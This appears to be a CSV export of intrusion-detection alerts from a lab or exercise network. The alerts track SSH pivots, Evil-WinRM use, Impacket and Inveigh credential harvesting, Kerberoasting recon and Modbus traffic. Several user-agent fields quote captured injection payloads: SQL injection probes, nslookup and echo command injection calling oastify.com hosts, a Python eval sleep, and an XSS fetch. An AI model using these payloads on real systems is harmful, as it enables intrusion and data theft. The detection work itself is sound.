SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32739,2025-03-28T09:20:29Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"1910,2896",,,10.0.242.127,10.0.12.30,,cf69d5d1-8e09-46a4-9e14-61e1e554cce2,
Low,32774,2025-03-28T10:19:46Z,Communication,Configuration,Detected 93 New Global User Agent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:19:46.276Z,"Sample New Global User Agent values include:
  dst__port: ('',);
  dst_asset_id: 1841, 1697, 1829, 1742;
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  dst_ip: 10.0.12.11, 10.0.5.12, 10.0.7.12, 10.0.4.12;
  src__mac: ;
  src_ip: 10.0.4.30, 10.0.7.30, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1910, 1905, 1914, 1936;
  dst__ip: ;
  host: 10.0.12.11, oastify.com, 10.0.4.12, 10.0.5.12, localhost;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo cxshsd7ofj sqooozn4bw||a #' |echo cxshsd7ofj sqooozn4bw||a #|"" |echo cxshsd7ofj sqooozn4bw||a #, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3671263895' or '9441'='9442;
  src__ip: ;",User Agent First Seen Globally,"1914,1742,1910,1841,1905,1936,1697,1829",,,"10.0.7.30,10.0.12.30,10.0.4.30,10.0.5.30","10.0.12.11,10.0.7.12,10.0.5.12,10.0.4.12",,"d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32785,2025-03-28T10:30:13Z,Indicator,Threat Behavior,SSH Banner Invalid,SSH Banner Invalid,SSH Hunting Signatures,"2896,1868",,,10.0.242.127,10.0.12.12,,Network Traffic,
Low,32800,2025-03-28T10:31:36Z,Indicator,Threat Behavior,SSH Banner Invalid,SSH Banner Invalid,SSH Hunting Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Low,32827,2025-03-28T10:40:50Z,Communication,Configuration,Detected 6 NewSMBTraffic between 2025-03-28T10:33:27.605Z and 2025-03-28T10:40:50.630Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1721, 1868, 1919, 1854, 1697, 135;
  uuid: cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_FileInfo, SMB_TreeInfo;
  protocol: ;
  versions: , SMB2, SMB1;
  src_asset_id: 48, 1910, 1801, 1729, 1933, 1704;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"48,1910,1801,1729,1933,1704,1721,1868,1919,1854,1697,135",,,"10.0.2.11,10.0.12.30,10.0.10.29,10.0.9.29,10.0.11.30,10.0.5.29","10.0.11.12,10.0.12.12,10.0.10.30,10.0.9.12,10.0.5.12,10.0.2.43",,"cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5",
Low,32850,2025-03-28T09:16:01Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"1910,2896",,,10.0.242.127,10.0.12.30,,385623f2-9dcc-4efb-9e2f-5d7644acb9a7,
Low,32913,2025-03-28T10:31:44Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1910 (10.0.12.30) to then pivot to asset 1868 (10.0.12.12) via SSH.,Interactive Session Pivots,"2896,1868",,,10.0.242.127,10.0.12.12,,,
Medium,32971,2025-03-28T10:56:51Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,33273,2025-03-28T10:15:41Z,Communication,Configuration,New Global User Agent,User Agent 'curl/8.13.0-rc2' was seen in the environment for the first time. Originating from asset 1910 (10.0.12.30) to 10.0.12.11 (10.0.12.11).,User Agent First Seen Globally,"1910,1742",,,10.0.12.30,10.0.12.11,,a9e34fd2-8761-4a7e-8837-55c0eec6990d,
Low,33351,2025-03-28T09:46:52Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.12.30 (1910) to host 10.0.12.12 (1868). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1910,1868",,,10.0.12.30,10.0.12.12,,,
Low,33352,2025-03-28T09:46:44Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.12.12 (1868) to host 10.0.12.30 (1910). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1910,1868",,,10.0.12.12,10.0.12.30,,,
Low,33353,2025-03-28T09:46:37Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.12.12 (1868) to host 10.0.12.30 (1910). If unencrypted, may also include the RDP cookie (nina), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1910,1868",,,10.0.12.12,10.0.12.30,,,
Low,33354,2025-03-28T09:46:37Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.12.30 (1910) to host 10.0.12.12 (1868). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1910,1868",,,10.0.12.30,10.0.12.12,,,
Low,33534,2025-03-28T09:48:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"2896,1910",,,10.0.242.127,10.0.12.30,,4edacc48-279c-454a-a25e-17498a181312,
Low,33537,2025-03-28T09:36:19Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"2896,1910",,,10.0.242.127,10.0.12.30,,c18e32fd-4f43-4844-8a66-dcf470d64c37,
Low,33538,2025-03-28T09:28:09Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"2896,1910",,,10.0.242.127,10.0.12.30,,a8662db2-750f-4d10-be88-6108b5138aad,
Low,33651,2025-03-28T10:50:52Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1910 (10.0.12.30) to then pivot to asset 1868 (10.0.12.12) via SSH.,Interactive Session Pivots,"2896,1868",,,10.0.242.127,10.0.12.12,,,
Medium,33699,2025-03-28T11:26:22Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Medium,33700,2025-03-28T11:26:22Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Low,33753,2025-03-28T11:26:22Z,Communication,Indicator,Failed HTTP Logon,"Asset 1868 (10.0.12.12) returned an HTTP response code of 401 'Unauthorized' to asset 1910 (10.0.12.30), which represents a failed logon attempt via HTTP by asset 1910. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1910,1868",,,10.0.12.12,10.0.12.30,,934bc142-01ce-4e1a-98c1-b28ea34ebc0e,
Medium,33769,2025-03-28T11:31:01Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1737",,,10.0.12.30,10.0.12.29,,Network Traffic,
Low,33794,2025-03-28T11:42:21Z,Communication,Configuration,Detected 12 NewSMBTraffic between 2025-03-28T11:31:29.266Z and 2025-03-28T11:42:21.141Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1680, 1732, 1898, 118, 1910, 1841, 52, 46, 1767, 1810;
  uuid: 50f3166f-5c02-4947-910f-2331500151ed, efa06317-ec96-4f23-abbd-9ee3df4d036f, a7a5a1f9-da1c-4474-8167-442185f2cbf4, 00336763-76bc-4085-a33e-4909ed0a517e, 30d47459-86f9-49c8-94c8-186e42d0f6c4, 50c42ce6-be66-46b6-855c-aff1cdbaf0f4, 6f707686-5c3c-4c11-814f-0a3fa7ceee28, 5156947a-a413-4249-a810-95a42a584182, 06a5f450-843f-4b46-9361-7901c8dc5a0a, 70cde21e-17eb-4f90-a59f-afc767e8fd29;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_TreeInfo, SMB_FileInfo;
  protocol: ;
  versions: , SMB2, SMB1;
  src_asset_id: 1737, 45, 1772, 1746, 1729, 1754, 1854;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"1754,1898,1737,45,1772,1746,1729,1854,1680,1732,118,1910,1841,52,46,1767,1810",,,"10.0.6.11,10.0.12.29,10.0.1.11,10.0.7.11,10.0.6.29,10.0.9.29,10.0.9.12","10.0.6.30,10.0.7.29,10.0.9.11,10.0.1.43,10.0.12.30,10.0.7.12,10.0.1.10,10.0.1.12,10.0.7.43,10.0.6.12",,"50f3166f-5c02-4947-910f-2331500151ed, efa06317-ec96-4f23-abbd-9ee3df4d036f, a7a5a1f9-da1c-4474-8167-442185f2cbf4, 00336763-76bc-4085-a33e-4909ed0a517e, 30d47459-86f9-49c8-94c8-186e42d0f6c4, 50c42ce6-be66-46b6-855c-aff1cdbaf0f4, 6f707686-5c3c-4c11-814f-0a3fa7ceee28, 5156947a-a413-4249-a810-95a42a584182, 06a5f450-843f-4b46-9361-7901c8dc5a0a, 70cde21e-17eb-4f90-a59f-afc767e8fd29",
Low,33832,2025-03-28T11:30:51Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.60.,SSH Authentication Failure,"2896,1662",,,10.0.242.127,10.0.12.60,,e16fc6a4-e1ea-453d-833b-eb79af0ac100,
Low,33833,2025-03-28T11:35:20Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.12.30.,SSH Authentication Failure,"2896,1910",,,10.0.242.127,10.0.12.30,,a1c5d0fc-0cf2-45ed-b4de-3f5879f9cca6,
Low,35108,2025-03-28T12:01:43Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1910 and Asset:1737,New SMB Communication Detection,"1910,1737",,,10.0.12.30,10.0.12.29,,3b76e4f5-a4a3-41df-8b1c-afd0e60a4d30,
Low,35157,2025-03-28T12:16:03Z,Indicator,Threat Behavior,SMB NTLMSSP Server Challenge - Credential Harvesting - Impacket 0x4141414141414141,SMB NTLMSSP Server Challenge - Credential Harvesting - Impacket 0x4141414141414141,SMB Credential Harvesting,"1910,1737",,,10.0.12.30,10.0.12.29,,Network Traffic,
Low,35242,2025-03-28T12:28:15Z,Communication,Configuration,New SMB Communication detected,New SMB_TreeInfo (version: ) traffic between Asset:1737 and Asset:1910,New SMB Communication Detection,"1910,1737",,,10.0.12.29,10.0.12.30,,41321f6b-5b6a-4f22-8625-5a14c4a9e577,
Low,35316,2025-03-28T12:41:02Z,Indicator,Indicator,Nmap Possible - ICMP echo 0x00 120 payload,Nmap Possible - ICMP echo 0x00 120 payload,Nmap Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35317,2025-03-28T12:41:04Z,Indicator,Indicator,Nmap Possible - ICMP echo 0x00 150 payload,Nmap Possible - ICMP echo 0x00 150 payload,Nmap Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Medium,35325,2025-03-28T12:42:15Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1910,1737",,,10.0.12.30,10.0.12.29,,Network Traffic,
Low,35350,2025-03-28T12:42:15Z,Communication,Indicator,Failed HTTP Logon,"Asset 1737 (10.0.12.29) returned an HTTP response code of 401 'Unauthorized' to asset 1910 (10.0.12.30), which represents a failed logon attempt via HTTP by asset 1910. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1910,1737",,,10.0.12.29,10.0.12.30,,1bf670bd-e189-4726-9668-7c2d15389b0f,
Low,35376,2025-03-28T12:20:09Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1910 (10.0.12.30) to then pivot to asset 1742 (10.0.12.11) via RDP.,Interactive Session Pivots,"2896,1742",,,10.0.242.127,10.0.12.11,,,
Medium,35384,2025-03-28T12:44:20Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1737",,,10.0.12.30,10.0.12.29,,Network Traffic,
Low,35405,2025-03-28T12:49:43Z,Indicator,Indicator,Nmap Possible - ICMP echo 0x00 120 payload,Nmap Possible - ICMP echo 0x00 120 payload,Nmap Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35406,2025-03-28T12:49:45Z,Indicator,Indicator,Nmap Possible - ICMP echo 0x00 150 payload,Nmap Possible - ICMP echo 0x00 150 payload,Nmap Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35593,2025-03-28T13:10:52Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35597,2025-03-28T13:10:55Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35603,2025-03-28T13:11:28Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Medium,35606,2025-03-28T13:11:27Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Low,35607,2025-03-28T13:11:38Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Medium,35610,2025-03-28T13:11:47Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Low,35616,2025-03-28T13:12:19Z,Indicator,Threat Behavior,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Based Recon,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35617,2025-03-28T13:12:19Z,Indicator,Threat Behavior,LDAP Request ServicePrincipalName,LDAP Request ServicePrincipalName,LDAP Based Recon,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35663,2025-03-28T12:47:32Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1910 (10.0.12.30) to then pivot to asset 1742 (10.0.12.11) via SSH.,Interactive Session Pivots,"2896,1742",,,10.0.242.127,10.0.12.11,,,
Medium,35727,2025-03-28T13:23:29Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Medium,35738,2025-03-28T13:24:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1737",,,10.0.12.30,10.0.12.29,,Network Traffic,
Medium,35739,2025-03-28T13:24:01Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Low,35794,2025-03-28T13:29:07Z,Communication,Configuration,Detected 58 NewModbusTCPCommunication between 2025-03-28T13:23:34.648Z and 2025-03-28T13:29:07.987Z,"Sample NewModbusTCPCommunication values include:
  dst__port: ('',);
  ip_src: 10.0.6.60, 10.0.8.60, 10.0.4.60, 10.0.4.74, 10.0.3.74, 10.0.7.60, 10.0.12.74, 10.0.2.74, 10.0.7.74, 10.0.12.60;
  dst_asset_id: 569, 1940, 1662, 1945, 1881, 1827, 1870, 139, 1839, 1866;
  modbus_unit_id: 1;
  uuid: f99b7166-074c-49b3-b9cc-b1307d4479f0, f1014924-345e-423c-b279-7dd84abece49, 50102667-9195-4552-85a9-e49446a7c093, 387f6ac9-c501-48c8-a074-77d9cbdd9ad5, 51de78bb-b55e-4827-9826-709f8402dd57, 293ad670-a386-4459-a920-e393618c79be, 67df2f30-34ee-48ec-96dc-4115b369ca49, d71e7f37-9b68-47d4-b039-5215f400ae1c, 3ff1f76d-b482-419f-941f-a82e7627e03b, 877d9b3b-d656-46fa-b295-93c8b5455a56;
  ip_dst: 10.0.6.60, 10.0.8.60, 10.0.4.60, 10.0.4.74, 10.0.3.74, 10.0.7.60, 10.0.12.74, 10.0.2.74, 10.0.7.74, 10.0.12.60;
  src__mac: ;
  dst__mac: ;
  modbus_function_code_description: Read Input Registers, Read Holding Registers, Read Coils, Execute Operation, Read Discrete Inputs, Write Single Coil;
  protocol: ;
  modbus_exception_code_description: ;
  src_asset_id: 569, 1940, 1662, 1945, 1827, 1870, 1881, 1926, 1839, 1866;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",ModbusTCP New Function Code,"1839,1662,1866,1881,569,1940,1945,1827,1870,1926,139",,,"10.0.7.60,10.0.12.60,10.0.12.74,10.0.4.60,10.0.2.74,10.0.3.60,10.0.8.74,10.0.4.74,10.0.8.60,10.0.6.60","10.0.7.60,10.0.12.60,10.0.12.74,10.0.4.60,10.0.2.74,10.0.3.60,10.0.8.74,10.0.4.74,10.0.8.60,10.0.2.60",,"f99b7166-074c-49b3-b9cc-b1307d4479f0, f1014924-345e-423c-b279-7dd84abece49, 50102667-9195-4552-85a9-e49446a7c093, 387f6ac9-c501-48c8-a074-77d9cbdd9ad5, 51de78bb-b55e-4827-9826-709f8402dd57, 293ad670-a386-4459-a920-e393618c79be, 67df2f30-34ee-48ec-96dc-4115b369ca49, d71e7f37-9b68-47d4-b039-5215f400ae1c, 3ff1f76d-b482-419f-941f-a82e7627e03b, 877d9b3b-d656-46fa-b295-93c8b5455a56",
Low,36097,2025-03-28T14:03:39Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Medium,36273,2025-03-28T14:24:44Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1910,1742",,,10.0.12.30,10.0.12.11,,Network Traffic,
Medium,36284,2025-03-28T14:27:27Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1910,1868",,,10.0.12.30,10.0.12.12,,Network Traffic,
Low,36293,2025-03-28T14:24:35Z,Communication,Configuration,Detected 11 RDP New Comms between 2025-03-28T14:14:40.852Z and 2025-03-28T14:24:35.303Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.10.43, 10.0.12.11, 10.0.6.29, 10.0.5.43, 10.0.12.12, 10.0.7.11, 10.0.10.44, 10.0.3.44;
  dst_asset_id: 1898, 1896, 1910, 1807, 2896, 1801, 1686, 1693, 1914;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.10.43, 10.0.242.127, 10.0.7.30, 10.0.5.44, 10.0.6.30, 10.0.10.29, 10.0.3.30, 10.0.10.44, 10.0.12.30;
  rdp_selected_protocol: , hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1868, 1772, 1746, 1807, 1707, 1695, 1686, 1742;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , PLUMETECH, frank, fernando, martin, bob, dragon;
  src__ip: ;",RDP New Comms Pattern,"1807,1686,2896,1896,1707,1801,1695,1693,1910,1868,1914,1746,1898,1772,1742",,,"10.0.10.44,10.0.10.43,10.0.3.44,10.0.5.43,10.0.12.12,10.0.6.29,10.0.7.11,10.0.12.11","10.0.10.44,10.0.10.43,10.0.242.127,10.0.3.30,10.0.10.29,10.0.5.44,10.0.12.30,10.0.7.30,10.0.6.30",,,
